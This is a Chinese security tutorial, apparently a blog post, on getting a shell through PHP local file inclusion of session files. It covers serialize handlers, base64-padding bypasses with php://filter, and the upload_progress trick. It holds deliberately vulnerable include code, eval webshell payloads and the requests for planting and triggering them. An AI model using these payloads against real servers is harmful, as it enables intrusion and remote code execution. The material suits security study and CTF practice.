> 原文链接: https://www.anquanke.com//post/id/201177 


# LFI 绕过 Session 包含限制 Getshell


                                阅读量   
                                **813380**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t012b907328af8dab4f.png)](https://p2.ssl.qhimg.com/t012b907328af8dab4f.png)



## 前言

之前打CTF和挖洞的时候遇到过不少服务器本地文件包含`Session`的漏洞，不过几乎这种`Session`包含漏洞都会有一些限制的，需要结合一些特殊的技巧去`Bypass`，于是打算整理一下关于`PHP LFI`绕过`Session`包含限制`Getshell`的一些奇思妙想。



## 用户会话

在了解session包含文件漏洞及绕过姿势的时候，我们应该首先了解一下服务器上针对用户会话session的存储与处理是什么过程，只有了解了其存储和使用机制我们才能够合理的去利用它得到我们想要的结果。

### <a class="reference-link" name="%E4%BC%9A%E8%AF%9D%E5%AD%98%E5%82%A8"></a>会话存储

<a class="reference-link" name="%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F"></a>**存储方式**

`Java`是将用户的session存入内存中，而`PHP`则是将session以文件的形式存储在服务器某个文件中，可以在`php.ini`里面设置session的存储位置`session.save_path`。

可以通过phpinfo查看`session.save_path`的值

[![](https://p2.ssl.qhimg.com/t014d2518adc177a80d.png)](https://p2.ssl.qhimg.com/t014d2518adc177a80d.png)

知道session的存储后，总结常见的php-session默认存放位置是很有必要的，因为在很多时候服务器都是按照默认设置来运行的，这个时候假如我们发现了一个没有安全措施的session包含漏洞就可以尝试利用默认的会话存放路径去包含利用。
- **默认路径**
```
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

<a class="reference-link" name="%E5%91%BD%E5%90%8D%E6%A0%BC%E5%BC%8F"></a>**命名格式**

如果某个服务器存在session包含漏洞，要想去成功的包含利用的话，首先必须要知道的是服务器是如何存放该文件的，只要知道了其命名格式我们才能够正确的去包含该文件。

`session`的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到。

[![](https://p2.ssl.qhimg.com/t012982c7815dd0da46.png)](https://p2.ssl.qhimg.com/t012982c7815dd0da46.png)

### <a class="reference-link" name="%E4%BC%9A%E8%AF%9D%E5%A4%84%E7%90%86"></a>会话处理

在了解了用户会话的存储下来就需要了解php是如何处理用户的会话信息。php中针对用户会话的处理方式主要取决于服务器在php.ini或代码中对`session.serialize_handler`的配置。

<a class="reference-link" name="session.serialize_handler"></a>**session.serialize_handler**

PHP中处理用户会话信息的主要是下面定义的两种方式

```
session.serialize_handler = php           一直都在(默认方式)  它是用 |分割

session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize反序列化格式分割
```

下面看一下针对PHP定义的不同方式对用户的session是如何处理的，我们只有知道了服务器是如何存储session信息的，才能够往session文件里面传入我们所精心制作的恶意代码。

<a class="reference-link" name="session.serialize_handler=php"></a>**session.serialize_handler=php**

服务器在配置文件或代码里面没有对session进行配置的话，PHP默认的会话处理方式就是`session.serialize_handler=php`这种模式机制。

下面通过一个简单的用户会话过程了解`session.serialize_handler=php`是如何工作的。

`session.php`

```
&lt;?php

    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;

?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0194c4d441cf3c2e13.png)

从图中可以看到默认`session.serialize_handler=php`处理模式只对用户名的内容进行了序列化存储，没有对变量名进行序列化，可以看作是服务器对用户会话信息的半序列化存储过程。

<a class="reference-link" name="session.serialize_handler=php_serialize"></a>**session.serialize_handler=php_serialize**

php5.5之后启用这种处理模式，它是用serialize反序列化格式进行存储用户的会话信息。一样的通过一个简单的用户会话过程了解`session.serialize_handler=php_serialize`是如何工作的。这种模式可以在php.ini或者代码中进行设置。

`session.php`

```
&lt;?php

    ini_set('session.serialize_handler', 'php_serialize');    
    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;

?&gt;
```

[![](https://p3.ssl.qhimg.com/t01b9e94052d820dc81.png)](https://p3.ssl.qhimg.com/t01b9e94052d820dc81.png)

从图中可以看到`session.serialize_handler=php_serialize`处理模式，对整个session信息包括文件名、文件内容都进行了序列化处理，可以看作是服务器对用户会话信息的完全序列化存储过程。

对比上面`session.serialize_handler`的两种处理模式，可以看到他们在session处理上的差异，既然有差异我们就要合理的去利用这两种处理模式，假如编写代码不规范的时候处理session同时用了两种模式，那么在攻击者可以利用的情况下，很可能会造成session反序列化漏洞。



## LFI Session

介绍了用户会话的存储和处理机制后，我们就可以去深入的理解session文件包含漏洞。LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如Session会话文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

其中针对`LFI Session`文件的包含或许是现在见的比较多，简单的理解session文件包含漏洞就是在用户可以控制session文件中的一部分信息，然后将这部分信息变成我们的精心构造的恶意代码，之后去包含含有我们传入恶意代码的这个session文件就可以达到攻击效果。下面通过一个简单的案例演示这个漏洞利用攻击的过程。

### <a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>测试代码

session.php

```
&lt;?php

    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;

?&gt;
```

index.php

```
&lt;?php

    $file  = $_GET['file'];
    include($file);

?&gt;
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

分析session.php可以看到用户会话信息username的值用户是可控的，因为服务器没有对该部分作出限制。那么我们就可以传入恶意代码就行攻击利用

payload

```
http://192.33.6.145/FI/session/session.php

POST
username=&lt;?php eval($_REQUEST[Qftm]);?&gt;

```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014a62bc8d3baad0cb.png)

可以看到有会话产生，同时我们也已经写入了我们的恶意代码。

既然已经写入了恶意代码，下来就要利用文件包含漏洞去包含这个恶意代码，执行我们想要的结果。借助上一步产生的sessionID进行包含利用构造相应的payload。

payload

```
PHPSESSID：7qefqgu07pluu38m45isiesq3s

index.php?file=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s

POST
Qftm=system('whoami');
```

[![](https://p1.ssl.qhimg.com/t0183a02840cfb6b253.png)](https://p1.ssl.qhimg.com/t0183a02840cfb6b253.png)

从攻击结果可以看到我们的payload和恶意代码确实都已经正常解析和执行。

### <a class="reference-link" name="%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6"></a>包含限制

在上面我们所介绍的只是一种简单的理想化的漏洞条件，所以你会看到这么简单就利用成功了，但是，事实上在平常我们所遇到的会有很多限制，比如说代码中对用户会话信息做了一定的处理然后才进行存储，这些处理操作常见的包括对用户session信息进行编码或加密等。另外常见的限制比如说服务器代码中没有出现代码`session_start();`进行会话的初始化操作，这个时候服务器就无法生成用户session文件，攻击者也就没有办法就进行恶意session文件的包含。

下面主要针对这几种session包含限制，利用系统服务或代码本身的缺陷进行探索与利用。



## Session Base64Encode

很多时候服务器上存储的Session信息都是经过处理的（编码或加密），这个时候假如我们利用本地文件包含漏洞直接包含恶意session的时候是没有效果的。那么该怎么去绕过这个限制呢，一般做法是逆过程，既然他选择了编码或加密，我们就可以尝试着利用解码或解密的手段还原真实session，然后再去包含，这个时候就能够将恶意的session信息包含利用成功。

很多时候服务器上的session信息会由base64编码之后再进行存储，那么假如存在本地文件包含漏洞的时候该怎么去利用绕过呢？下面通过一个案例进行讲解与利用。

### <a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>测试代码

**session.php**

```
&lt;?php

    session_start();
    $username = $_POST['username'];
    $_SESSION['username'] = base64_encode($username);
    echo "username -&gt; $username";

?&gt;
```

**index.php**

```
&lt;?php

    $file  = $_GET['file'];
    include($file);

?&gt;
```

### <a class="reference-link" name="%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8"></a>常规利用

正常情况下我们会先传入恶意代码在服务器上存储恶意session文件

[![](https://p4.ssl.qhimg.com/t0162c0798eb6681d7e.png)](https://p4.ssl.qhimg.com/t0162c0798eb6681d7e.png)

然后在利用文件包含漏洞去包含session

[![](https://p5.ssl.qhimg.com/t01a3c1116f5d3d457f.png)](https://p5.ssl.qhimg.com/t01a3c1116f5d3d457f.png)

从包含结果可以看到我们包含的session被编码了，导致`LFI -&gt; session`失败。

在不知道源代码的情况下，从编码上看可以判断是base64编码处理的

[![](https://p1.ssl.qhimg.com/t01e299478706635b56.png)](https://p1.ssl.qhimg.com/t01e299478706635b56.png)

在这里可以用逆向思维想一下，他既然对我们传入的session进行了base64编码，那么我们是不是只要对其进行base64解码然后再包含不就可以了，这个时候`php://filter`就可以利用上了。

构造payload

```
index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl
```

[![](https://p4.ssl.qhimg.com/t0169b9573014c14587.png)](https://p4.ssl.qhimg.com/t0169b9573014c14587.png)

意外的事情发生了，你发现解码后包含的内容竟然是乱码！！这是为什么呢？？

### <a class="reference-link" name="Bypass%20serialize_handler=php"></a>Bypass serialize_handler=php

对于上面利用`php://filter`的base64解码功能进行解码包含出现了错误，还是不能够利用成功，回过头仔细想想会发现，session存储的一部分信息是用户名base64编码后的信息，然而我们对session进行base64解码的是整个session信息，也就是说编码和解码的因果关系不对，也就导致解码的结果是乱码。

那有没有什么办法可以让base64编码和解码的因果关系对照上，答案是有的，先来了解一下base64编码与解码的原理。

<a class="reference-link" name="Base64%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81"></a>**Base64编码与解码**

Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。

<a class="reference-link" name="base64%E7%B4%A2%E5%BC%95%E8%A1%A8"></a>**base64索引表**

base64编码与解码的基础索引表如下

[![](https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png)](https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png)

<a class="reference-link" name="base64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86"></a>**base64编码原理**

**（1）base64编码过程**

Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。

由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。

完整的Base64定义可见RFC1421和RFC2045。因为Base64算法是将3个字节原数据编码为4个字节新数据，所以Base64编码后的数据比原始数据略长，为原来的4/3。

**（2）简单编码流程**

```
1）将所有字符转化为ASCII码；

2）将ASCII码转化为8位二进制；

3）将8位二进制3个归成一组(不足3个在后边补0)共24位，再拆分成4组，每组6位；

4）将每组6位的二进制转为十进制；

5）从Base64编码表获取十进制对应的Base64编码；
```

下面举例对字符串`“ABCD”`进行base64编码：

[![](https://p3.ssl.qhimg.com/t0178a983065875c97e.png)](https://p3.ssl.qhimg.com/t0178a983065875c97e.png)

对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。

<a class="reference-link" name="base64%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86"></a>**base64解码原理**

**（1）base64解码过程**

base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。

解码过程可以参考上图，逆向理解：`“QUJDRA==” ——&gt;“ABCD”`

**（2）base64解码特点**

base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。下面编写一个简单的代码，测试一组数据看是否满足我们所说的情况。
- **测试代码**
探测base64_decode解码的特点

```
&lt;?php
/**
 * Created by PhpStorm.
 * User: Qftm
 * Date: 2020/3/17
 * Time: 9:16
 */

$basestr0="QftmrootQftm";
$basestr1="Qftm#root@Qftm";
$basestr2="Qftm^root&amp;Qftm";
$basestr3="Qft&gt;mro%otQftm";
$basestr4="Qf%%%tmroo%%%tQftm";

echo base64_decode($basestr0)."n";
echo base64_decode($basestr1)."n";
echo base64_decode($basestr2)."n";
echo base64_decode($basestr3)."n";
echo base64_decode($basestr4)."n";
?&gt;
```
- 运行结果
[![](https://p3.ssl.qhimg.com/t01251b992d2780d543.png)](https://p3.ssl.qhimg.com/t01251b992d2780d543.png)

从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

<a class="reference-link" name="Bypass%20base64_encode"></a>**Bypass base64_encode**

了解了base64编码原理之后和解码的特点，怎么让base64解码和编码的因果关系对照上，其实就很简单了，我们只要让session文件中base64编码的前面这一部分`username|s:40:"`正常解码就可以，怎么才能正常解码呢，需要满足base64解码的原理，就是4个字节能够还原原始的3个字节信息，也就是说session前面的这部分数据长度需要满足4的整数倍，如果不满足的话，就会影响session后面真正的base64编码的信息，也就导致上面出现的乱码情况。

<a class="reference-link" name="Bypass%E5%88%86%E6%9E%90%E5%88%A4%E6%96%AD"></a>**Bypass分析判断**

正常情况下base64解码包含`serialize_handler=php`处理过的原始session信息，未能正常解析执行

```
username|s:40:"PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=";

?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e4d4e6139a38fccf.png)

依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，`username|s:1:"`这部分数据长度为14，实际解码为`usernames1`，实际长度为10，不满足情况。

4组解码-&gt;缺少两个字节，后面需占两位（`X` 代表占位符）

```
username|s:1:"  //原始未处理信息

user name s1XX  //base64解码特点，去除特殊字符，填充两个字节'XX'
```

当session存储的信息中用户名编码后的长度为两位数时，`username|s:11:"`这部分数据长度为15，实际解码为`usernames11`，实际长度为11，不满足情况。

4组解码-&gt;缺少一个字节，后面需占一位

```
username|s:11:"   //原始未处理信息

user name s11X   //base64解码特点，去除特殊字符，填充一个字节'X'
```

当session存储的信息中用户名编码后的长度为三位数时，`username|s:111:"`这部分数据长度为16，实际解码为`usernames111`，长度为12，满足情况。

4组解码-&gt;缺少零个字节，后面需占零位

```
username|s:11:"   //原始未处理信息

user name s111  //base64解码特点，去除特殊字符，填充0个字节'X'
```

这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。

再次构造payload

```
POST：
username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST['mtfq']);?&gt;
```

先测试payload编码后的长度是否满足构造需求

base64编码

```
cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01102c2bb064030f1c.png)

编码测长

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019939997cc96cef63.png)

结果中可以看到payload满足长度的需求。

<a class="reference-link" name="Bypass%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"></a>**Bypass攻击利用**

分析怎么绕过之后，可以构造payload传入恶意session

```
http://192.33.6.145/FI/session/session.php

POST：
username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST['mtfq']);?&gt;
```

[![](https://p2.ssl.qhimg.com/t017115bc0983d380f4.png)](https://p2.ssl.qhimg.com/t017115bc0983d380f4.png)

然后构造payload包含恶意session

```
http://192.33.6.145/FI/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl

POST：
mtfq=phpinfo();
```

[![](https://p5.ssl.qhimg.com/t01bf7a2f5d8b335464.png)](https://p5.ssl.qhimg.com/t01bf7a2f5d8b335464.png)

从相应结果中可以看到，在PHP默认的会话处理模式`serialize_handler=php`下，我们这次构造的payload成功解析了，达到了预期的目的。

<a class="reference-link" name="Getshell"></a>**Getshell**

尝试蚁剑连接我们session中传入的恶意代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0116020796790f82da.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014b7e9374dc4957a4.png)

从连接情况上看，后门代码的运行是正常的没有出现问题。

### <a class="reference-link" name="Bypass%20serialize_handler=php_serialize"></a>Bypass serialize_handler=php_serialize

看到这里可能有人会想上面默认处理的是`session.serialize_handler = php`这种模式，那么针对`session.serialize_handler = php_serialize`这种处理方式呢，答案是一样的，只要能构造出相应的`payload`满足恶意代码的正常解码就可以。

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>**测试代码**

**session.php**

```
&lt;?php

    ini_set('session.serialize_handler', 'php_serialize');    
    session_start();
    $username = $_POST['username'];
    $_SESSION['username'] = base64_encode($username);
    echo "username -&gt; $username";

?&gt;
```

<a class="reference-link" name="Bypass%E5%88%86%E6%9E%90%E5%88%A4%E6%96%AD"></a>**Bypass分析判断**

正常情况下base64解码包含`serialize_handler=php_serialize`处理过的原始session信息，未能正常解析执行

```
a:1:`{`s:8:"username";s:40:"PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=";`}`

?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s
```

[![](https://p0.ssl.qhimg.com/t01c8b40c29c560a0b1.png)](https://p0.ssl.qhimg.com/t01c8b40c29c560a0b1.png)

这中模式下的分析，和上面Bypass分析的手段是一样的，同样依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，`a:1:`{`s:8:"username";s:1:"`这部分数据长度为25，实际解码为`a1s8usernames1`，实际长度为14，不满足情况。

4组解码-&gt;缺少两个字节，后面需占两位（`X` 代表占位符）

```
a:1:`{`s:8:"username";s:1:"  //原始未处理信息

a1s8 user name s1XX  //base64解码特点，去除特殊字符，填充两个字节'XX'

```

当session存储的信息中用户名编码后的长度为两位数时，`a:1:`{`s:8:"username";s:11:"`这部分数据长度为26，实际解码为`a1s8usernames11`，实际长度为15，不满足情况。

4组解码-&gt;缺少一个字节，后面需占一位

```
a:1:`{`s:8:"username";s:11:"   //原始未处理信息

a1s8 user name s11X   //base64解码特点，去除特殊字符，填充一个字节'X'

```

当session存储的信息中用户名编码后的长度为三位数时，`a:1:`{`s:8:"username";s:11:"`这部分数据长度为27，实际解码为`a1s8usernames111`，长度为16，满足情况。

4组解码-&gt;缺少零个字节，后面需占零位

```
a:1:`{`s:8:"username";s:111:"  //原始未处理信息

a1s8 user name s111  //base64解码特点，去除特殊字符，填充0个字节'X'

```

这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。

构造payload

```
POST：
username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST['mtfq']);?&gt;
```

先测试payload编码后的长度是否满足构造需求

base64编码

```
cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a6447b9047326306.png)

编码测长

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011c8641d113086382.png)

结果中可以看到payload满足长度的需求。

<a class="reference-link" name="Bypass%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"></a>**Bypass攻击利用**

再次构造payload传入恶意session

```
http://192.33.6.145/FI/session/session.php

POST：
username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST['mtfq']);?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fed54ce904a3713e.png)

然后构造payload包含向服务器生成的恶意session

```
http://192.33.6.145/FI/session/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s

POST：
mtfq=phpinfo();
```

[![](https://p1.ssl.qhimg.com/t017da11e3fb0578e4b.png)](https://p1.ssl.qhimg.com/t017da11e3fb0578e4b.png)

从相应结果中可以看到，这种模式下`session.serialize_handler = php_serialize`，我们构造的payload也成功的解析了，同样达到了预期的目的。

<a class="reference-link" name="Getshell"></a>**Getshell**

尝试蚁剑连接我们session中传入的恶意代码

[![](https://p3.ssl.qhimg.com/t014c5cf2c7438db9d8.png)](https://p3.ssl.qhimg.com/t014c5cf2c7438db9d8.png)



## No session_start()

### <a class="reference-link" name="phpinfo%20session"></a>phpinfo session

一般情况下，`session_start()`作为会话的开始出现在用户登录等地方以维持会话，但是，如果一个站点存在`LFI`漏洞，却没有用户会话那么该怎么去包含session信息呢，这个时候我们就要想想系统内部本身有没有什么地方可以直接帮助我们产生session并且一部分数据是用户可控的，很意外的是这种情况存在，下面分析一下怎么去利用。

想要具体了解session信息就要熟悉session在系统中有哪些配置。默认情况下，`session.use_strict_mode`值是0，此时用户是可以自己定义`Session ID`的。比如，我们在Cookie里设置`PHPSESSID=Qftm`，PHP将会在服务器上创建一个文件：`/var/lib/php/sessions/sess_Qftm`。

但这个技巧的实现要满足一个条件：服务器上需要已经初始化Session。 在PHP中，通常初始化Session的操作是执行session_start()。所以我们在审计PHP代码的时候，会在一些公共文件或入口文件里看到上述代码。那么，如果一个网站没有执行这个初始化的操作，是不是就不能在服务器上创建文件了呢？很意外是可以的。下面看一下php.ini里面关键的几个配置项

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018bf95c18fe0d3587.png)

`session.auto_start`：顾名思义，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。

`session.upload_progress.enabled = on`：默认开启这个选项，表示`upload_progress`功能开始，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。

`session.upload_progress.cleanup = on`：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。

`session.upload_progress.prefix = "upload_progress_"`：

`session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"`：当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。

`session.upload_progress.freq = "1%"`+`session.upload_progress.min_freq = "1"`：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。

`session.upload_progress`：php&gt;=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。 而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。那么，如何利用这个特性呢？

**查看官方给的案列**

PHP_SESSION_UPLOAD_PROGRESS的官方手册

```
http://php.net/manual/zh/session.upload-progress.php
```

一个上传进度数组的结构的例子

```
&lt;form action="upload.php" method="POST" enctype="multipart/form-data"&gt;
 &lt;input type="hidden" name="&lt;?php echo ini_get("session.upload_progress.name"); ?&gt;" value="123" /&gt;
 &lt;input type="file" name="file1" /&gt;
 &lt;input type="file" name="file2" /&gt;
 &lt;input type="submit" /&gt;
&lt;/form&gt;
```

在session中存放的数据看上去是这样子的：

```
&lt;?php
$_SESSION["upload_progress_123"] = array(
 "start_time" =&gt; 1234567890,   // The request time
 "content_length" =&gt; 57343257, // POST content length
 "bytes_processed" =&gt; 453489,  // Amount of bytes received and processed
 "done" =&gt; false,              // true when the POST handler has finished, successfully or not
 "files" =&gt; array(
  0 =&gt; array(
   "field_name" =&gt; "file1",       // Name of the &lt;input/&gt; field
   // The following 3 elements equals those in $_FILES
   "name" =&gt; "foo.avi",
   "tmp_name" =&gt; "/tmp/phpxxxxxx",
   "error" =&gt; 0,
   "done" =&gt; true,                // True when the POST handler has finished handling this file
   "start_time" =&gt; 1234567890,    // When this file has started to be processed
   "bytes_processed" =&gt; 57343250, // Amount of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 =&gt; array(
   "field_name" =&gt; "file2",
   "name" =&gt; "bar.avi",
   "tmp_name" =&gt; NULL,
   "error" =&gt; 0,
   "done" =&gt; false,
   "start_time" =&gt; 1234567899,
   "bytes_processed" =&gt; 54554,
  ),
 )
);
```

### <a class="reference-link" name="Bypass%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"></a>Bypass思路分析

从官方的案例和结果可以看到session中一部分数据(`session.upload_progress.name`)是用户自己可以控制的。那么我们只要上传文件的时候，在Cookie中设置`PHPSESSID=Qftm`（默认情况下session.use_strict_mode=0用户可以自定义Session ID），同时POST一个恶意的字段`PHP_SESSION_UPLOAD_PROGRESS` ，（PHP_SESSION_UPLOAD_PROGRESS在session.upload_progress.name中定义），只要上传包里带上这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID=Qftm，所以Session文件将会自动创建。

